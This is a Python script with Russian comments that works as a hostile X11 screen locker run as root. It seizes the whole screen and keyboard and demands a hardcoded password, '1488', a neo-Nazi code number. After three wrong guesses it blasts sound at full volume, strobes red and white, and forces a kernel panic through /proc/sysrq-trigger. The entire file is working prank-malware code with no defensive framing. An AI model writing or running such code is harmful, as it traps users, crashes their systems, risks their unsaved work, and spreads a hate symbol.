#!/usr/bin/env python3
import os, sys, time, threading, subprocess
from Xlib import X, XK
from Xlib.display import Display

PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS
input_buffer = ""

# Функции разрушения
def play_loud_sound():
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

def trigger_kernel_panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")

class Locker:
    def __init__(self):
        self.disp = Display()
        self.screen = self.disp.screen()
        self.width = self.screen.width_in_pixels
        self.height = self.screen.height_in_pixels
        self.root = self.screen.root

        # Цвета
        self.colormap = self.screen.default_colormap
        self.black = self.screen.black_pixel
        self.green = self.colormap.alloc_color(0, 65535, 0).pixel
        self.red = self.colormap.alloc_color(65535, 0, 0).pixel
        self.white = self.colormap.alloc_color(65535, 65535, 65535).pixel

        # Окно поверх всего, без рамок
        self.win = self.root.create_window(
            0, 0, self.width, self.height, 0,
            self.screen.root_depth,
            X.InputOutput,
            X.CopyFromParent,
            background_pixel=self.black,
            event_mask=X.ExposureMask,
            override_redirect=True
        )
        self.win.map()
        self.disp.flush()

        # Графический контекст и шрифт
        self.gc = self.win.create_gc(foreground=self.green, background=self.black)
        self.font = self.disp.open_font("fixed")

        # Захват клавиатуры на корень – никакие шоткаты не просочатся
        self.root.grab_keyboard(
            True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime
        )
        self.disp.flush()

        self.running = True

    def draw_centered_text(self, text, y, color_pixel=None):
        """Рисует строку зелёным (или указанным цветом) по центру экрана."""
        if color_pixel is None:
            color_pixel = self.green
        self.gc.change(foreground=color_pixel)
        # Закодируем в Latin-1, Xlib ожидает список bytes‑строк
        text_bytes = text.encode("latin-1")
        self.win.draw_text(self.font, self.gc,
                           self.width//2 - len(text) * 4,  # примерный отступ
                           y, [text_bytes])
        self.disp.flush()

    def redraw(self):
        """Полная перерисовка экрана (чёрный фон + весь текст)."""
        self.win.clear_area(0, 0, self.width, self.height)
        self.draw_centered_text("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", 50)
        self.draw_centered_text(f"ATTEMPTS LEFT: {attempts_left}", 100)
        stars = "*" * len(input_buffer)
        self.draw_centered_text(f"> {stars}", 150)
        keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
        for i, line in enumerate(keys):
            self.draw_centered_text(line, 210 + i*40)

    def flash(self):
        """Мигание красным/белым 10 раз (скримерный эффект)."""
        for i in range(10):
            pixel = self.red if i % 2 == 0 else self.white
            self.win.change_attributes(background_pixel=pixel)
            self.disp.flush()
            time.sleep(0.1)
        self.win.change_attributes(background_pixel=self.black)
        self.disp.flush()

    def run(self):
        self.redraw()
        while self.running:
            event = self.disp.next_event()
            if event.type == X.KeyPress:
                keysym = self.disp.keycode_to_keysym(event.detail, 0)
                if keysym == XK.XK_Return:
                    self.check_password()
                elif keysym == XK.XK_BackSpace:
                    global input_buffer
                    input_buffer = input_buffer[:-1]
                    self.redraw()
                elif keysym in (XK.XK_0, XK.XK_1, XK.XK_2, XK.XK_3, XK.XK_4,
                                XK.XK_5, XK.XK_6, XK.XK_7, XK.XK_8, XK.XK_9):
                    if len(input_buffer) < 4:
                        input_buffer += chr(keysym)
                        self.redraw()
            elif event.type == X.Expose:
                self.redraw()

    def check_password(self):
        global attempts_left, input_buffer, running
        if input_buffer == PASSWORD:
            self.cleanup()
            sys.exit(0)
        else:
            input_buffer = ""
            attempts_left -= 1
            if attempts_left <= 0:
                self.running = False
                self.trigger_failure()
            else:
                self.redraw()

    def trigger_failure(self):
        # Звук в фоне
        threading.Thread(target=play_loud_sound, daemon=True).start()
        # Мигание
        self.flash()
        # Через 5 секунд после начала – kernel panic
        threading.Timer(5.0, trigger_kernel_panic).start()
        # Оставляем окно висеть до перезагрузки
        while True:
            time.sleep(1)

    def cleanup(self):
        self.root.ungrab_keyboard(X.CurrentTime)
        self.win.destroy()
        self.disp.close()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root (sudo).")
        sys.exit(1)
    locker = Locker()
    locker.run()
